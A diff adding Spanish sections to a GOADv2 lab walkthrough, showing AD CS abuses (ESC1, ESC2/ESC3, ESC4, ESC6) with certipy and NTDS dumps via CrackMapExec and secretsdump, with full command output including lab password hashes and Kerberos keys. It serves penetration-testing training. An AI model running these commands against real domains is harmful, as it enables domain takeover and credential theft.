@@ -44,6 +44,10 @@ Un agradecimiento a [M4yFly](https://twitter.com/M4yFly){:target="_blank"} por c
     1. [ESC8 - coerce to domain admin](https://angussmoody.github.io/active_directory/Solucion_GOADv2/#esc8---coerce-to-domain-admin)
     2. [ESC8 - con certipy](https://angussmoody.github.io/active_directory/Solucion_GOADv2/#esc8---con-certipy)
     3. [ADCS enumeración con certipy y bloodhound](https://angussmoody.github.io/active_directory/Solucion_GOADv2/#adcs-enumeraci%C3%B3n-con-certipy-y-bloodhound)
+    4. [ADCS - ESC1](V2%203228f321aac9449ba3f7809af01821b5.md)
+    5. [ADCS - ESC2 & ESC3](V2%203228f321aac9449ba3f7809af01821b5.md)
+    6. [ADCS - ESC4](V2%203228f321aac9449ba3f7809af01821b5.md)
+    7. [ADCS - ESC6](V2%203228f321aac9449ba3f7809af01821b5.md)
     
 ---
 
@@ -3751,3 +3755,402 @@ Luego, se selecciona la entrada relacionada con PKI y se cambia a la pestaña de
 ![Untitled](/assets/images/2023-08-18-Solucion_GOADv2/Untitled%2028.png)
 
 ---
+
+## ADCS - ESC1
+    
+    ![Untitled](/assets/images/2023-08-18-Solucion_GOADv2/Untitled%2029.png)
+    
+    Se ejecuta certipy para extraer los archivos necesarios para realizar la enumeración, utilizando el comando: `certipy find -u khal.drogo@essos.local -p 'horse' -dc-ip 192.168.56.12`
+    
+    ```csharp
+    ┌─[root@angussmoody]─[/mnt/angussMoody/Goadv2]
+    └──╼ #certipy find -u khal.drogo@essos.local -p 'horse' -dc-ip 192.168.56.12
+    Certipy v4.7.0 - by Oliver Lyak (ly4k)
+    
+    [*] Finding certificate templates
+    [*] Found 38 certificate templates
+    [*] Finding certificate authorities
+    [*] Found 1 certificate authority
+    [*] Found 16 enabled certificate templates
+    [*] Trying to get CA configuration for 'ESSOS-CA' via CSRA
+    [*] Got CA configuration for 'ESSOS-CA'
+    [*] Saved BloodHound data to '20230907210109_Certipy.zip'. Drag and drop the file into the BloodHound GUI from @ly4k
+    [*] Saved text output to '20230907210109_Certipy.txt'
+    [*] Saved JSON output to '20230907210109_Certipy.json'
+    ```
+    
+    Se corre el BloodHound modificado,,  [ly4k - BloodHound](https://github.com/ly4k/BloodHound/releases) y se carga el archivo .zip. Una vez cargado, se procede a la sección PKI - Find Misconfigured Certificate Templates (ESC1)
+    
+    ![Untitled](/assets/images/2023-08-18-Solucion_GOADv2/Untitled%2030.png)
+    
+    Ahora se ejecuta certipy para obtener el archivo PFX del usuario solicitado, en este caso, el usuario es "administrator".
+    
+    ```jsx
+    ┌─[root@angussmoody]─[/mnt/angussMoody/Goadv2]
+    └──╼ #certipy req -u khal.drogo@essos.local -p 'horse' -target braavos.essos.local -template ESC1 -ca ESSOS-CA -upn administrator@essos.local
+    Certipy v4.7.0 - by Oliver Lyak (ly4k)
+    
+    [*] Requesting certificate via RPC
+    [*] Successfully requested certificate
+    [*] Request ID is 15
+    [*] Got certificate with UPN 'administrator@essos.local'
+    [*] Certificate has no object SID
+    [*] Saved certificate and private key to 'administrator.pfx'
+    ```
+    
+    Se ejecuta certipy para obtener el hash del administrador. Con este hash, se puede proceder a realizar un volcado del NTDS.
+    
+    ```jsx
+    ┌─[✗]─[root@angussmoody]─[/mnt/angussMoody/Goadv2]
+    └──╼ #certipy auth -pfx administrator.pfx -dc-ip 192.168.56.12
+    Certipy v4.8.1 - by Oliver Lyak (ly4k)
+    
+    [*] Using principal: administrator@essos.local
+    [*] Trying to get TGT...
+    [*] Got TGT
+    [*] Saved credential cache to 'administrator.ccache'
+    [*] Trying to retrieve NT hash for 'administrator'
+    [*] Got hash for 'administrator@essos.local': aad3b435b51404eeaad3b435b51404ee:54296a48cd30259cc88095373cec24da
+    ```
+    
+    Para este ejemplo, el volcado del NTDS se realizará con CrackMapExec y SecretsDump. Con CrackMapExec, el proceso se llevaría a cabo de la siguiente manera:
+    
+    ```jsx
+    ┌─[root@angussmoody]─[/mnt/angussMoody/Goadv2]
+    └──╼ #cme smb essos.local -u administrator -H '54296a48cd30259cc88095373cec24da' --ntds
+    [!] Dumping the ntds can crash the DC on Windows Server 2019. Use the option --user <user> to dump a specific user safely or the module -M ntdsutil [Y/n] y
+    SMB         essos.local     445    MEEREEN          [*] Windows Server 2016 Standard Evaluation 14393 x64 (name:MEEREEN) (domain:essos.local) (signing:True) (SMBv1:True)
+    SMB         essos.local     445    MEEREEN          [+] essos.local\administrator:54296a48cd30259cc88095373cec24da (Pwn3d!)
+    SMB         essos.local     445    MEEREEN          [+] Dumping the NTDS, this could take a while so go grab a redbull...
+    SMB         essos.local     445    MEEREEN          Administrator:500:aad3b435b51404eeaad3b435b51404ee:54296a48cd30259cc88095373cec24da:::
+    SMB         essos.local     445    MEEREEN          Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+    SMB         essos.local     445    MEEREEN          krbtgt:502:aad3b435b51404eeaad3b435b51404ee:82199d0eb8901cba42316debbb953240:::
+    SMB         essos.local     445    MEEREEN          DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+    SMB         essos.local     445    MEEREEN          vagrant:1000:aad3b435b51404eeaad3b435b51404ee:e02bc503339d51f71d913c245d35b50b:::
+    SMB         essos.local     445    MEEREEN          daenerys.targaryen:1110:aad3b435b51404eeaad3b435b51404ee:34534854d33b398b66684072224bb47a:::
+    SMB         essos.local     445    MEEREEN          viserys.targaryen:1111:aad3b435b51404eeaad3b435b51404ee:d96a55df6bef5e0b4d6d956088036097:::
+    SMB         essos.local     445    MEEREEN          khal.drogo:1112:aad3b435b51404eeaad3b435b51404ee:739120ebc4dd940310bc4bb5c9d37021:::
+    SMB         essos.local     445    MEEREEN          jorah.mormont:1113:aad3b435b51404eeaad3b435b51404ee:4d737ec9ecf0b9955a161773cfed9611:::
+    SMB         essos.local     445    MEEREEN          sql_svc:1114:aad3b435b51404eeaad3b435b51404ee:84a5092f53390ea48d660be52b93b804:::
+    SMB         essos.local     445    MEEREEN          angussmoody:1115:aad3b435b51404eeaad3b435b51404ee:58cf12d7448ca3ea7da502c83ee6a31e:::
+    SMB         essos.local     445    MEEREEN          MEEREEN$:1001:aad3b435b51404eeaad3b435b51404ee:9decb68b4803a098eb288827205b563a:::
+    SMB         essos.local     445    MEEREEN          BRAAVOS$:1104:aad3b435b51404eeaad3b435b51404ee:c4b53445fe63f650ab42e57a3ebf18fe:::
+    SMB         essos.local     445    MEEREEN          SEVENKINGDOMS$:1105:aad3b435b51404eeaad3b435b51404ee:8f511bf07c331b08a63201072f305f49:::
+    SMB         essos.local     445    MEEREEN          [+] Dumped 14 NTDS hashes to /root/.cme/logs/MEEREEN_essos.local_2023-09-20_204355.ntds of which 11 were added to the database
+    SMB         essos.local     445    MEEREEN          [*] To extract only enabled accounts from the output file, run the following command: 
+    SMB         essos.local     445    MEEREEN          [*] cat /root/.cme/logs/MEEREEN_essos.local_2023-09-20_204355.ntds | grep -iv disabled | cut -d ':' -f1
+    SMB         essos.local     445    MEEREEN          [*] grep -iv disabled /root/.cme/logs/MEEREEN_essos.local_2023-09-20_204355.ntds | cut -d ':' -f1
+    ```
+    
+    Mientras que con SecretsDump, el proceso se llevaría a cabo de la siguiente manera:
+    
+    ```jsx
+    ┌─[✗]─[root@angussmoody]─[/mnt/angussMoody/Goadv2]
+    └──╼ #secretsdump.py essos.local/Administrator@192.168.56.12 -hashes aad3b435b51404eeaad3b435b51404ee:54296a48cd30259cc88095373cec24da
+    Impacket v0.11.0 - Copyright 2023 Fortra
+    
+    [*] Target system bootKey: 0x36b4dabbe335b1566796b562f4d4ca17
+    [*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
+    Administrator:500:aad3b435b51404eeaad3b435b51404ee:54296a48cd30259cc88095373cec24da:::
+    Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+    DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+    [*] Dumping cached domain logon information (domain/username:hash)
+    [*] Dumping LSA Secrets
+    [*] $MACHINE.ACC 
+    ESSOS\MEEREEN$:aes256-cts-hmac-sha1-96:28541fbd37869fbd918dbf46ca11e32731196e19fa90f1381cea65e769afa126
+    ESSOS\MEEREEN$:aes128-cts-hmac-sha1-96:74d357e09591e374496cd2f3e104cc67
+    ESSOS\MEEREEN$:des-cbc-md5:9dc829a1e9a2b519
+    ESSOS\MEEREEN$:plain_password_hex:a344ae5f916bf85a97050ccd659269d193c53fd36576808b7591a04faa86ab0cbaeffc0874eb6663eb4580b681d756a9be1595cbf94c257307e5df1062be3510de2bb9c554f46136b990585cad4469d348d62a623c4ccb37a2e3d4ea51396160e427a901f770755a01ae875ea52cb2545adf4218a351e3140225375b5c17db3221f3a8063c5a79e366f81774606f0d17cca325c967c114517cb3af18073787a61088d12dc5d3c5d70e80a5e8816909f3697813abc8355d82cfea559106593c3a03b250a7ae9c03a878ad3a24e68bc822cb4466864612a2e60da25b889dc2cc3ae24445d1edd7407b2bcc301621c3fd96
+    ESSOS\MEEREEN$:aad3b435b51404eeaad3b435b51404ee:9decb68b4803a098eb288827205b563a:::
+    [*] DPAPI_SYSTEM 
+    dpapi_machinekey:0xd9f66019f506afb6b435c0dd6ea91db69b6b4524
+    dpapi_userkey:0x2b68afc0da10647bb1caf7136c662203b7e7e9cf
+    [*] NL$KM 
+     0000   48 12 38 16 FC 21 D8 4B  13 02 2E EF A9 E1 B3 FF   H.8..!.K........
+     0010   C8 F3 E1 9B 62 AC A5 2C  F8 3E 07 1B 66 C5 93 AD   ....b..,.>..f...
+     0020   06 16 32 5D 1D 00 C0 84  9B EF 1F 84 1C B1 E3 F3   ..2]............
+     0030   41 8A ED 9D 0A 6A 75 6F  EC 7B D9 79 CF 8E 24 D9   A....juo.{.y..$.
+    NL$KM:48123816fc21d84b13022eefa9e1b3ffc8f3e19b62aca52cf83e071b66c593ad0616325d1d00c0849bef1f841cb1e3f3418aed9d0a6a756fec7bd979cf8e24d9
+    [*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+    [*] Using the DRSUAPI method to get NTDS.DIT secrets
+    Administrator:500:aad3b435b51404eeaad3b435b51404ee:54296a48cd30259cc88095373cec24da:::
+    Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+    krbtgt:502:aad3b435b51404eeaad3b435b51404ee:82199d0eb8901cba42316debbb953240:::
+    DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+    vagrant:1000:aad3b435b51404eeaad3b435b51404ee:e02bc503339d51f71d913c245d35b50b:::
+    daenerys.targaryen:1110:aad3b435b51404eeaad3b435b51404ee:34534854d33b398b66684072224bb47a:::
+    viserys.targaryen:1111:aad3b435b51404eeaad3b435b51404ee:d96a55df6bef5e0b4d6d956088036097:::
+    khal.drogo:1112:aad3b435b51404eeaad3b435b51404ee:739120ebc4dd940310bc4bb5c9d37021:::
+    jorah.mormont:1113:aad3b435b51404eeaad3b435b51404ee:4d737ec9ecf0b9955a161773cfed9611:::
+    sql_svc:1114:aad3b435b51404eeaad3b435b51404ee:84a5092f53390ea48d660be52b93b804:::
+    angussmoody:1115:aad3b435b51404eeaad3b435b51404ee:58cf12d7448ca3ea7da502c83ee6a31e:::
+    MEEREEN$:1001:aad3b435b51404eeaad3b435b51404ee:9decb68b4803a098eb288827205b563a:::
+    BRAAVOS$:1104:aad3b435b51404eeaad3b435b51404ee:c4b53445fe63f650ab42e57a3ebf18fe:::
+    SEVENKINGDOMS$:1105:aad3b435b51404eeaad3b435b51404ee:8f511bf07c331b08a63201072f305f49:::
+    [*] Kerberos keys grabbed
+    krbtgt:aes256-cts-hmac-sha1-96:b46977016f518d492039b32b58925cf9b4192ea145fe2b1d0c2e40e44df021f9
+    krbtgt:aes128-cts-hmac-sha1-96:d2ecac8e0dd5c4b0190c3dde4ad0862c
+    krbtgt:des-cbc-md5:c8a708384cefa12f
+    daenerys.targaryen:aes256-cts-hmac-sha1-96:cf091fbd07f729567ac448ba96c08b12fa67c1372f439ae093f67c6e2cf82378
+    daenerys.targaryen:aes128-cts-hmac-sha1-96:eeb91a725e7c7d83bfc7970532f2b69c
+    daenerys.targaryen:des-cbc-md5:bc6ddf7ce60d29cd
+    viserys.targaryen:aes256-cts-hmac-sha1-96:b4124b8311d9d84ee45455bccbc48a108d366d5887b35428075b644e6724c96e
+    viserys.targaryen:aes128-cts-hmac-sha1-96:4b34e2537da4f1ac2d16135a5cb9bd3e
+    viserys.targaryen:des-cbc-md5:70528fa13bc1f2a1
+    khal.drogo:aes256-cts-hmac-sha1-96:2ef916a78335b11da896216ad6a4f3b1fd6276938d14070444900a75e5bf7eb4
+    khal.drogo:aes128-cts-hmac-sha1-96:7d76da251df8d5cec9bf3732e1f6c1ac
+    khal.drogo:des-cbc-md5:b5ec4c1032ef020d
+    jorah.mormont:aes256-cts-hmac-sha1-96:286398f9a9317f08acd3323e5cef90f9e84628c43597850e22d69c8402a26ece
+    jorah.mormont:aes128-cts-hmac-sha1-96:896e68f8c9ca6c608d3feb051f0de671
+    jorah.mormont:des-cbc-md5:b926916289464ffb
+    sql_svc:aes256-cts-hmac-sha1-96:ca26951b04c2d410864366d048d7b9cbb252a810007368a1afcf54adaa1c0516
+    sql_svc:aes128-cts-hmac-sha1-96:dc0da2bdf6dc56423074a4fd8a8fa5f8
+    sql_svc:des-cbc-md5:91d6b0df31b52a3d
+    angussmoody:aes256-cts-hmac-sha1-96:da6575ba99aeed92d15fbfe9b23a1c4e8b5c46b9c5db9da8c672f619200d1880
+    angussmoody:aes128-cts-hmac-sha1-96:7e3cf40500816ea8b445cbd9e25d1ea1
+    angussmoody:des-cbc-md5:43a4ec689b58fe38
+    MEEREEN$:aes256-cts-hmac-sha1-96:28541fbd37869fbd918dbf46ca11e32731196e19fa90f1381cea65e769afa126
+    MEEREEN$:aes128-cts-hmac-sha1-96:74d357e09591e374496cd2f3e104cc67
+    MEEREEN$:des-cbc-md5:375bc24f19a4c237
+    BRAAVOS$:aes256-cts-hmac-sha1-96:b80bb4421614543de530f4c68bc9dd747bee87119f34777d8d69b5046187d7c3
+    BRAAVOS$:aes128-cts-hmac-sha1-96:7229c601ba26a872bed6d8e47dbb3327
+    BRAAVOS$:des-cbc-md5:92ec98684026e3f4
+    SEVENKINGDOMS$:aes256-cts-hmac-sha1-96:bce046a40d2b5715424fa74fe2c8d8693f5a4bf804c2c36c00253e71a675891d
+    SEVENKINGDOMS$:aes128-cts-hmac-sha1-96:5a226a85e65aa8d5cfe2c899b9d4ad1b
+    SEVENKINGDOMS$:des-cbc-md5:7f54e9fb4513014a
+    [*] Cleaning up...
+    ```
+    
+    ---
+    
+
+## ADCS - ESC2 & ESC3
+
+![Untitled](/assets/images/2023-08-18-Solucion_GOADv2/Untitled%2031.png)
+
+Como se menciona en la página de certificación, "ESC2 es cuando una plantilla de certificado puede usarse para cualquier propósito. Dado que el certificado puede utilizarse para cualquier propósito, puede utilizarse para la misma técnica que con ESC3 para la mayoría de las plantillas de certificados".
+
+![Untitled](/assets/images/2023-08-18-Solucion_GOADv2/Untitled%2032.png)
+
+Se solicita un certificado de seguridad en el entorno para el usuario khal.drogo, utilizando la plantilla de certificado y la Autoridad de Certificación correspondientes. El certificado se almacena en un archivo PFX para su uso en autenticación y seguridad.
+
+```csharp
+┌─[root@angussmoody]─[/mnt/angussMoody/Goadv2/ESC2]
+└──╼ #certipy req -u khal.drogo@essos.local -p 'horse' -target 192.168.56.23 -template ESC2 -ca ESSOS-CA
+Certipy v4.8.1 - by Oliver Lyak (ly4k)
+
+[*] Requesting certificate via RPC
+[*] Successfully requested certificate
+[*] Request ID is 26
+[*] Got certificate with UPN 'khal.drogo@essos.local'
+[*] Certificate has no object SID
+[*] Saved certificate and private key to 'khal.drogo.pfx'
+```
+
+Se solicita un certificado en nombre del usuario khal.drogo. El certificado se obtiene de la Autoridad de Certificación 'ESSOS-CA' y utiliza la plantilla 'User'. La autenticación se realiza en nombre del administrador 'essos\administrator', y finalmente, el certificado se guarda como 'administrator.pfx'.
+
+```csharp
+┌─[root@angussmoody]─[/mnt/angussMoody/Goadv2/ESC2]
+└──╼ #certipy req -u khal.drogo@essos.local -p 'horse' -target 192.168.56.23 -template User -ca ESSOS-CA -on-behalf-of 'essos\administrator' -pfx khal.drogo.pfx
+Certipy v4.8.1 - by Oliver Lyak (ly4k)
+
+[*] Requesting certificate via RPC
+[*] Successfully requested certificate
+[*] Request ID is 27
+[*] Got certificate with UPN 'administrator@essos.local'
+[*] Certificate has no object SID
+[*] Saved certificate and private key to 'administrator.pfx'
+```
+
+Se emplea el certificado administrator.pfx para autenticarse como el usuario administrator en el controlador de dominio 192.168.56.12 con el fin de obtener un Ticket Granting Ticket (TGT). Luego, se guarda una memoria caché de credenciales con el nombre 'administrator.ccache' y se recupera el hash NT del usuario administrator, que es 'aad3b435b51404eeaad3b435b51404ee:54296a48cd30259cc88095373cec24da'.
+
+```csharp
+┌─[root@angussmoody]─[/mnt/angussMoody/Goadv2/ESC2]
+└──╼ #certipy auth -pfx administrator.pfx -dc-ip 192.168.56.12
+Certipy v4.8.1 - by Oliver Lyak (ly4k)
+
+[*] Using principal: administrator@essos.local
+[*] Trying to get TGT...
+[*] Got TGT
+[*] Saved credential cache to 'administrator.ccache'
+[*] Trying to retrieve NT hash for 'administrator'
+[*] Got hash for 'administrator@essos.local': aad3b435b51404eeaad3b435b51404ee:54296a48cd30259cc88095373cec24da
+```
+
+En el caso de ESC3, se estarán realizando los mismos pasos mencionados anteriormente.
+
+Se solicita un certificado de seguridad en el entorno para el usuario khal.drogo.
+
+```csharp
+┌─[root@angussmoody]─[/mnt/angussMoody/Goadv2/ESC3]
+└──╼ #certipy req -u khal.drogo@essos.local -p 'horse' -target 192.168.56.23 -template ESC3-CRA -ca ESSOS-CA
+Certipy v4.8.1 - by Oliver Lyak (ly4k)
+
+[*] Requesting certificate via RPC
+[*] Successfully requested certificate
+[*] Request ID is 31
+[*] Got certificate with UPN 'khal.drogo@essos.local'
+[*] Certificate has no object SID
+[*] Saved certificate and private key to 'khal.drogo.pfx'
+```
+
+Se solicita el certificado para el usuario administrator.
+
+```csharp
+┌─[root@angussmoody]─[/mnt/angussMoody/Goadv2/ESC3]
+└──╼ #certipy req -u khal.drogo@essos.local -p 'horse' -target 192.168.56.23 -template ESC3 -ca ESSOS-CA -on-behalf-of 'essos\administrator' -pfx khal.drogo.pfx
+Certipy v4.8.1 - by Oliver Lyak (ly4k)
+
+[*] Requesting certificate via RPC
+[*] Successfully requested certificate
+[*] Request ID is 32
+[*] Got certificate with UPN 'administrator@essos.local'
+[*] Certificate has no object SID
+[*] Saved certificate and private key to 'administrator.pfx'
+```
+
+Finalmente, se obtiene el Ticket Granting Ticket (TGT) y se recupera el hash NT.
+
+```csharp
+┌─[root@angussmoody]─[/mnt/angussMoody/Goadv2/ESC3]
+└──╼ #certipy auth -pfx administrator.pfx -username administrator -domain essos.local -dc-ip 192.168.56.12
+Certipy v4.8.1 - by Oliver Lyak (ly4k)
+
+[*] Using principal: administrator@essos.local
+[*] Trying to get TGT...
+[*] Got TGT
+[*] Saved credential cache to 'administrator.ccache'
+[*] Trying to retrieve NT hash for 'administrator'
+[*] Got hash for 'administrator@essos.local': aad3b435b51404eeaad3b435b51404ee:54296a48cd30259cc88095373cec24da
+```
+
+---
+
+## ADCS - ESC4
+
+![Untitled](/assets/images/2023-08-18-Solucion_GOADv2/Untitled%2033.png)
+
+![Untitled](/assets/images/2023-08-18-Solucion_GOADv2/Untitled%2034.png)
+
+Al ejecutar el comando, se actualiza una plantilla de certificado para ESC4 en el dominio essos.local. Durante este proceso, se realiza la autenticación con el servidor de LDAP y se crea una copia de seguridad de la configuración anterior en un archivo llamado ESC4.json esto se realiza con el comando `certipy template -u khal.drogo@essos.local -p 'horse' -template ESC4 -save-old -debug`
+
+```jsx
+┌─[root@angussmoody]─[/mnt/angussMoody/Goadv2/ESC4]
+└──╼ #certipy template -u khal.drogo@essos.local -p 'horse' -template ESC4 -save-old -debug
+Certipy v4.7.0 - by Oliver Lyak (ly4k)
+
+[+] Trying to resolve 'ESSOS.LOCAL' at '192.168.10.2'
+[+] Resolved 'ESSOS.LOCAL' from cache: 192.168.56.12
+[+] Authenticating to LDAP server
+[+] Bound to ldaps://192.168.56.12:636 - ssl
+[+] Default path: DC=essos,DC=local
+[+] Configuration path: CN=Configuration,DC=essos,DC=local
+[*] Saved old configuration for 'ESC4' to 'ESC4.json'
+[*] Updating certificate template 'ESC4'
+[+] MODIFY_DELETE:
+[+]     pKIExtendedKeyUsage: []
+[+]     msPKI-Certificate-Application-Policy: []
+[+]     msPKI-RA-Application-Policies: []
+[+] MODIFY_REPLACE:
+[+]     nTSecurityDescriptor: [b'\x01\x00\x04\x9c0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x14\x00\x00\x00\x02\x00\x1c\x00\x01\x00\x00\x00\x00\x00\x14\x00\xff\x01\x0f\x00\x01\x01\x00\x00\x00\x00\x00\x05\x0b\x00\x00\x00\x01\x05\x00\x00\x00\x00\x00\x05\x15\x00\x00\x00\xc8\xa3\x1f\xdd\xe9\xba\xb8\x90,\xaes\xbb\xf4\x01\x00\x00']
+[+]     flags: [b'0']
+[+]     pKIDefaultKeySpec: [b'2']
+[+]     pKIKeyUsage: [b'\x86\x00']
+[+]     pKIMaxIssuingDepth: [b'-1']
+[+]     pKICriticalExtensions: [b'2.5.29.19', b'2.5.29.15']
+[+]     pKIExpirationPeriod: [b'\x00@\x1e\xa4\xe8e\xfa\xff']
+[+]     pKIDefaultCSPs: [b'1,Microsoft Enhanced Cryptographic Provider v1.0']
+[+]     msPKI-RA-Signature: [b'0']
+[+]     msPKI-Enrollment-Flag: [b'0']
+[+]     msPKI-Certificate-Name-Flag: [b'1']
+[*] Successfully updated 'ESC4'
+```
+
+El comando anterior proporciona como resultado un archivo .json con la configuración correspondiente.
+
+```jsx
+┌─[root@angussmoody]─[/mnt/angussMoody/Goadv2/ESC4]
+└──╼ #ls
+ESC4.json
+```
+
+Se solicita el certificado para el usuario administrator con el comando: **`certipy req -u khal.drogo@essos.local -p 'horse' -target braavos.essos.local -template ESC4 -ca ESSOS-CA -upn administrator@essos.local`**
+
+```jsx
+┌─[root@angussmoody]─[/mnt/angussMoody/Goadv2/ESC4]
+└──╼ #certipy req -u khal.drogo@essos.local -p 'horse' -target braavos.essos.local -template ESC4 -ca ESSOS-CA -upn administrator@essos.local
+Certipy v4.7.0 - by Oliver Lyak (ly4k)
+
+[*] Requesting certificate via RPC
+[*] Successfully requested certificate
+[*] Request ID is 35
+[*] Got certificate with UPN 'administrator@essos.local'
+[*] Certificate has no object SID
+[*] Saved certificate and private key to 'administrator.pfx'
+```
+
+Se obtiene el Ticket Granting Ticket (TGT) y se recupera el hash NT con el comando: **certipy auth -pfx administrator.pfx -dc-ip 192.168.56.12**
+
+```jsx
+┌─[root@angussmoody]─[/mnt/angussMoody/Goadv2/ESC4]
+└──╼ #certipy auth -pfx administrator.pfx -dc-ip 192.168.56.12
+Certipy v4.7.0 - by Oliver Lyak (ly4k)
+
+[*] Using principal: administrator@essos.local
+[*] Trying to get TGT...
+[*] Got TGT
+[*] Saved credential cache to 'administrator.ccache'
+[*] Trying to retrieve NT hash for 'administrator'
+[*] Got hash for 'administrator@essos.local': aad3b435b51404eeaad3b435b51404ee:54296a48cd30259cc88095373cec24da
+```
+
+y por último se deshace la configuración de la plantilla con el comando: `certipy template -u khal.drogo@essos.local -p 'horse' -template ESC4 -configuration ESC4.json`
+
+```jsx
+┌─[root@angussmoody]─[/mnt/angussMoody/Goadv2/ESC4]
+└──╼ #certipy template -u khal.drogo@essos.local -p 'horse' -template ESC4 -configuration ESC4.json
+Certipy v4.7.0 - by Oliver Lyak (ly4k)
+
+[*] Updating certificate template 'ESC4'
+[*] Successfully update 'ESC4'
+```
+
+---
+
+## ADCS - ESC6
+
+![Untitled](/assets/images/2023-08-18-Solucion_GOADv2/Untitled%2035.png)
+
+Como se menciona en la página de [Certipy:](https://github.com/ly4k/Certipy#esc6) 'ESC6 ocurre cuando la Autoridad de Certificación (CA) especifica la bandera EDITF_ATTRIBUTESUBJECTALTNAME2. Esta bandera permite al solicitante (enrollee) especificar un nombre alternativo de sujeto (SAN) arbitrario en todos los certificados, a pesar de la configuración de una plantilla de certificado’
+
+Debido a que ESSOS-CA es vulnerable a ESC6, podemos llevar a cabo el ataque ESC1, pero utilizando la plantilla de usuario en lugar de la plantilla ESC1, incluso si la plantilla de usuario tiene la opción 'Enrollee Supplies Subject' configurada en **falso**.
+
+Se solicita el certificado para el usuario administrator con el comando: `certipy req -u khal.drogo@essos.local -p 'horse' -target braavos.essos.local -template User -ca ESSOS-CA -upn administrator@essos.local`
+
+```jsx
+┌─[root@angussmoody]─[/mnt/angussMoody/Goadv2/ESC6]
+└──╼ #certipy req -u khal.drogo@essos.local -p 'horse' -target braavos.essos.local -template User -ca ESSOS-CA -upn administrator@essos.local
+Certipy v4.7.0 - by Oliver Lyak (ly4k)
+
+[*] Requesting certificate via RPC
+[*] Successfully requested certificate
+[*] Request ID is 42
+[*] Got certificate with UPN 'administrator@essos.local'
+[*] Certificate has no object SID
+[*] Saved certificate and private key to 'administrator.pfx'
+```
+
+Se obtiene el Ticket Granting Ticket (TGT) y se recupera el hash NT con el comando: certipy auth -pfx administrator.pfx -dc-ip 192.168.56.12
+
+```jsx
+┌─[root@angussmoody]─[/mnt/angussMoody/Goadv2/ESC6]
+└──╼ #certipy auth -pfx administrator.pfx -dc-ip 192.168.56.12
+Certipy v4.7.0 - by Oliver Lyak (ly4k)
+
+[*] Using principal: administrator@essos.local
+[*] Trying to get TGT...
+[*] Got TGT
+[*] Saved credential cache to 'administrator.ccache'
+[*] Trying to retrieve NT hash for 'administrator'
+[*] Got hash for 'administrator@essos.local': aad3b435b51404eeaad3b435b51404ee:54296a48cd30259cc88095373cec24da
+```
